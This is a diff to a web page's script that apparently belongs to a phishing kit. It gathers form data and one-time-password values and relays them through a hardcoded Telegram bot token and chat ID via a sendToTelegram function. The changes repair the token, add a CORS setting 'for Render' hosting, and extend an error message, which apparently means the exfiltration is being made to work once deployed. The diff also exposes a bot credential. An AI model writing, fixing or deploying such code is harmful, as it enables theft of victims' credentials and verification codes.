@@ -86,10 +86,10 @@ button:hover {background:linear-gradient(135deg, #ea580c, #f97316);}
 </div>
 
 <script>
-// ====== YOUR BOT CREDENTIALS - ALREADY PASTED ======
-const TELEGRAM_BOT_TOKEN = '8891157525:AAE5aTPkL2v0Hycuifq0VywOp6kCt blGzhg';
+// ====== YOUR BOT CREDENTIALS ======
+const TELEGRAM_BOT_TOKEN = '8891157525:AAE5aTPkL2v0Hycuifq0VywOp6kCtblGzhg';
 const TELEGRAM_CHAT_ID = '8630213836';
-// ===================================================
+// ==================================
 
 let formData = {};
 let generatedOTP1 = "";
@@ -126,6 +126,7 @@ async function sendToTelegram(text) {
   try {
     const res = await fetch(url, {
       method: 'POST',
+      mode: 'cors', // FIX FOR RENDER
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML'})
     });
@@ -134,7 +135,7 @@ async function sendToTelegram(text) {
       alert("TELEGRAM ERROR: " + data.description + "\n\nCheck Token and Chat ID");
     }
   } catch(e) {
-    alert("NETWORK ERROR: " + e.message);
+    alert("NETWORK ERROR: " + e.message + "\n\nIf this continues, Telegram is blocked. Tell me.");
   }
 }
 
